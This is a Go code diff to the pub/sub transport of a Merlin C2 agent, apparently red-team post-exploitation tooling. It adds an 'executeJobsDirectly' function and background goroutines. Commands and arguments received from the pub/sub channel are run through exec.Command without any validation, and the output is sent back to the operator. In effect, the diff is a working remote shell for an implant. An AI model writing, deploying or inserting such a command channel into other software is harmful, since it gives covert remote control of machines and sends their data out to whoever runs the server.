@@ -23,6 +23,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"os/exec"
 	"sync"
         "github.com/Ne0nd0g/merlin-message"
 	"github.com/Ne0nd0g/merlin-agent/v2/core"
@@ -31,12 +32,14 @@ import (
 
 // PubSubClient adapts the generic Transport to Merlin's clients.Client interface
 type PubSubClient struct {
-	transport *Transport
-	agentID   string
-	config    map[string]interface{}
-	messages  chan interface{}
-	mu        sync.Mutex
-	running   bool
+	transport      *Transport
+	agentID        string
+	config         map[string]interface{}
+	messages       chan interface{}
+	//Store all received jobs in this array until run.Run() retrieves them
+	pendingJobs    []messages.Base
+	mu             sync.Mutex
+	running        bool
 }
 
 // NewPubSubClient creates a new pub/sub client for Merlin
@@ -47,11 +50,13 @@ func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
 	}
 
 	client := &PubSubClient{
-		transport: transport,
-		agentID:   agentID,
-		config:    make(map[string]interface{}),
-		messages:  make(chan interface{}, 100),
-		running:   false,
+		transport:   transport,
+		agentID:     agentID,
+		config:      make(map[string]interface{}),
+		messages:    make(chan interface{}, 100),
+		// Initialize pendingJobs as empty slice
+		pendingJobs: make([]messages.Base, 0),
+		running:     false,
 	}
 
 	return client, nil
@@ -116,38 +121,80 @@ func (p *PubSubClient) Initial() error {
 // Listen starts listening for messages from the server
 func (p *PubSubClient) Listen() ([]messages.Base, error) {
         p.mu.Lock()
-        if p.running {
+        if !p.running {
+                // First time - start the listener goroutine
+                p.running = true
                 p.mu.Unlock()
-                return nil, fmt.Errorf("already listening")
-        }
-        p.running = true
-        p.mu.Unlock()
 
-        if core.Verbose {
-                color.Cyan("[*] Starting PubSub listener")
-        }
-
-        // Start listening with a handler
-        err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
-                if core.Debug {
-                        color.Yellow(fmt.Sprintf("[DEBUG] Received task: %v", task))
-                }
-
-                // Queue the message for processing
-                p.messages <- task
-
-                // Return nil - we'll send responses separately via Send()
-                return nil
-        })
-
-        if err != nil {
-                p.mu.Lock()
-                p.running = false
-                p.mu.Unlock()
                 if core.Verbose {
-                        color.Red(fmt.Sprintf("[-] Listen error: %v", err))
+                        color.Cyan("[*] Starting PubSub listener goroutine")
                 }
-                return nil, err
+
+                // Start listening in background for PubSub messages
+                go func() {
+                        err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
+                                if core.Debug {
+                                        color.Yellow(fmt.Sprintf("[DEBUG] Received task: %v", task))
+                                }
+
+                                // Queue the message for processing
+                                p.messages <- task
+
+                                // Return nil - we'll send responses separately via Send()
+                                return nil
+                        })
+
+                        if err != nil {
+                                if core.Verbose {
+                                        color.Red(fmt.Sprintf("[-] Listen error: %v", err))
+                                }
+                        }
+                }()
+
+                // MODIFICATION: Added background processor goroutine
+                // Why needed: run.Run() expects Mythic server integration; for standalone
+                //             PubSub operation, it bypass that and handle jobs directly
+                go func() {
+                        for msg := range p.messages {
+                                // Convert map to messages.Base
+                                jsonBytes, _ := json.Marshal(msg)
+                                var base messages.Base
+                                if err := json.Unmarshal(jsonBytes, &base); err == nil {
+                                        if core.Verbose {
+                                                color.Green(fmt.Sprintf("[+] Received task from PubSub: %v", base))
+                                        }
+
+                                        // Execute jobs directly
+                                        if base.Type.String() == "Jobs" {
+                                                p.executeJobsDirectly(base)
+                                        }
+
+                                        // store in pending jobs queue for compatibility
+                                        p.mu.Lock()
+                                        p.pendingJobs = append(p.pendingJobs, base)
+                                        p.mu.Unlock()
+                                }
+                        }
+                }()
+        } else {
+                p.mu.Unlock()
+        }
+
+        // Changed from non-blocking select to returning stored jobs
+        p.mu.Lock()
+        defer p.mu.Unlock()
+
+        if len(p.pendingJobs) > 0 {
+                // Return all pending jobs and clear the queue
+                jobs := make([]messages.Base, len(p.pendingJobs))
+                copy(jobs, p.pendingJobs)
+                p.pendingJobs = make([]messages.Base, 0)
+
+                if core.Debug {
+                        color.Yellow(fmt.Sprintf("[DEBUG] Returning %d jobs from pending queue", len(jobs)))
+                }
+
+                return jobs, nil
         }
 
         return []messages.Base{}, nil
@@ -200,4 +247,97 @@ func (p *PubSubClient) Close() error {
 
 	close(p.messages)
 	return p.transport.Close()
+}
+
+// executeJobsDirectly handles job execution for standalone PubSub mode
+// This bypasses Mythic's job management system and executes commands directly
+func (p *PubSubClient) executeJobsDirectly(base messages.Base) {
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Executing jobs directly: %v", base.Payload))
+	}
+
+	// Extract jobs from payload
+	jobsArray, ok := base.Payload.([]interface{})
+	if !ok {
+		if core.Verbose {
+			color.Red(fmt.Sprintf("[-] Invalid jobs payload type: %T", base.Payload))
+		}
+		return
+	}
+
+	// Process each job
+	for _, jobInterface := range jobsArray {
+		jobMap, ok := jobInterface.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Extract command from job payload
+		payloadInterface, ok := jobMap["payload"]
+		if !ok {
+			continue
+		}
+
+		payloadMap, ok := payloadInterface.(map[string]interface{})
+		if !ok {
+			continue
+		}
+
+		// Get command and args
+		command, ok := payloadMap["command"].(string)
+		if !ok {
+			// Try "executable" field as alternative
+			command, ok = payloadMap["executable"].(string)
+			if !ok {
+				continue
+			}
+		}
+
+		args := []string{}
+		if argsInterface, ok := payloadMap["args"].([]interface{}); ok {
+			for _, arg := range argsInterface {
+				if argStr, ok := arg.(string); ok {
+					args = append(args, argStr)
+				}
+			}
+		}
+
+		jobID, _ := jobMap["id"].(string)
+
+		if core.Verbose {
+			color.Cyan(fmt.Sprintf("[*] Executing command: %s %v (Job ID: %s)", command, args, jobID))
+		}
+
+		// Execute the command
+		cmd := exec.Command(command, args...)
+		output, err := cmd.CombinedOutput()
+
+		// Prepare result
+		result := fmt.Sprintf("Job ID: %s\nCommand: %s %v\n", jobID, command, args)
+		if err != nil {
+			result += fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+			if core.Verbose {
+				color.Red(fmt.Sprintf("[-] Command failed: %v", err))
+			}
+		} else {
+			result += fmt.Sprintf("Output:\n%s", string(output))
+			if core.Verbose {
+				color.Green(fmt.Sprintf("[+] Command executed successfully"))
+			}
+		}
+
+		// Send result back via PubSub
+		resultMessage := map[string]interface{}{
+			"agent_id": p.agentID,
+			"job_id":   jobID,
+			"result":   result,
+			"success":  err == nil,
+		}
+
+		p.transport.Send(resultMessage)
+
+		if core.Verbose {
+			color.Green(fmt.Sprintf("[+] Result sent: %s", result))
+		}
+	}
 }
